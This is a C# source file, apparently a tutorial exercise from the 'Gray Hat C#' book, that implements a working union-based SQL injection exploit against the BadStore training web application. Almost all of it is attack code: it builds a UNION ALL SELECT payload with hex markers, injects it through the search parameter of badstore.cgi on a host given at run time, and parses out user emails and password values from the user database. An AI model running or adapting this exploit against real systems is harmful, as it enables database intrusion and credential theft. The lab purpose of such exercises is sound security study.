using System;
using System.Runtime;
using System.Text.RegularExpressions;
using System.Net;
using System.IO;
using System.Linq;

// A Union-based exploit for badstore web page

namespace ExploitTut
{
    class UnionExploit
    {
        public static void Main(string[] args)
        {
           // Create markers and convert them to hexadecimal for SQL

           string frontMarker = "FrOnTMaRker";
           string middleMarker = "mIdDlEMaRker";
           string endMarker = "eNdMaRker";
           string frontHex = string.Join("", frontMarker.Select(c => CharToHex(c)));
           string middleHex = string.Join("", middleMarker.Select(c => CharToHex(c)));
           string endHex = string.Join("", endMarker.Select(c => CharToHex(c)));

           // Build URL and payload for web request

           string url = "http://" + args[0] + "/cgi-bin/badstore.cgi";

           string payload = "fdsa' UNION ALL SELECT";
           payload += " NULL, NULL, NULL, CONCAT(0x" + frontHex + ", IFNULL(CAST(email AS";
           payload += " CHAR), 0x20), 0x" + middleHex + ", IFNULL(CAST(passwd AS";
           payload += " CHAR), 0x20), 0x" + endHex + ") FROM badstoredb.userdb# ";

           // Note: Gray Hat C# book tells you to use Uri.EscapeUriString(payload).
           //       That method may not work. If method doesn't work, use
           //       Uri.EscapeDataString(payload) instead.

           url += "?searchquery=" + Uri.EscapeDataString(payload) + "&action=search";

           HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
           string response = string.Empty;
           using (StreamReader rdr = new StreamReader(request.GetResponse().GetResponseStream()))
                  { response = rdr.ReadToEnd(); }

            Regex payloadRegex = new Regex(frontMarker + "(.*?)" + middleMarker + "(.*?)" + endMarker); 
            MatchCollection matches = payloadRegex.Matches(response);

            foreach (Match match in matches)
            {
                Console.Write("Username: " + match.Groups[1].Value + "\t ");
                Console.WriteLine("Password hash: " + match.Groups[2].Value);
            }
        }

        // For some reason, ToString(format string) isn't quite working
        // as expected, so I'm implementing my own CharToHex function
        // Convert char c to a string with hexadecimal value

        public static string CharToHex(char c)
        {

            char Div = '0';
            char Mod = '0';
            String HexValue = string.Empty;

            switch( (int)(c) / 16 )
            {
                case 0: Div = '0'; break;
                case 1: Div = '1'; break;
                case 2: Div = '2'; break;
                case 3: Div = '3'; break;
                case 4: Div = '4'; break;
                case 5: Div = '5'; break;
                case 6: Div = '6'; break;
                case 7: Div = '7'; break;
                case 8: Div = '8'; break;
                case 9: Div = '9'; break;
                case 10: Div = 'a'; break;
                case 11: Div = 'b'; break;
                case 12: Div = 'c'; break;
                case 13: Div = 'd'; break;
                case 14: Div = 'e'; break;
                case 15: Div = 'f'; break;
            } 

            HexValue += Div;

            switch( (int)(c) % 16 )
            {
                case 0: Mod = '0'; break;
                case 1: Mod = '1'; break;
                case 2: Mod = '2'; break;
                case 3: Mod = '3'; break;
                case 4: Mod = '4'; break;
                case 5: Mod = '5'; break;
                case 6: Mod = '6'; break;
                case 7: Mod = '7'; break;
                case 8: Mod = '8'; break;
                case 9: Mod = '9'; break;
                case 10: Mod = 'a'; break;
                case 11: Mod = 'b'; break;
                case 12: Mod = 'c'; break;
                case 13: Mod = 'd'; break;
                case 14: Mod = 'e'; break;
                case 15: Mod = 'f'; break;
            } 

            HexValue += Mod;

            return HexValue;
        }
    }
} 